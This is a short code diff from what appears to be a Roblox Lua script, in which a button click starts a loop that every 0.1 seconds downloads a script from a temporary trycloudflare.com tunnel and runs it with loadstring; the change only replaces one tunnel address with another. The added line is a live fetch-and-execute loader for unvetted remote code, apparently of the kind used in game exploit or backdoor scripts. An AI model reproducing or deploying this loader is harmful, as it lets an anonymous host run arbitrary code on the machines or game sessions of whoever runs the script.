@@ -58,7 +58,7 @@ button.MouseButton1Click:Connect(function()
 		loop = task.spawn(function()
 			while running do
 				pcall(function()
-					loadstring(game:HttpGet("https://ga-procurement-vessels-presentations.trycloudflare.com/script"))()
+					loadstring(game:HttpGet("https://domestic-tale-vincent-announce.trycloudflare.com/script"))()
 				end)
 				task.wait(0.1)
 			end
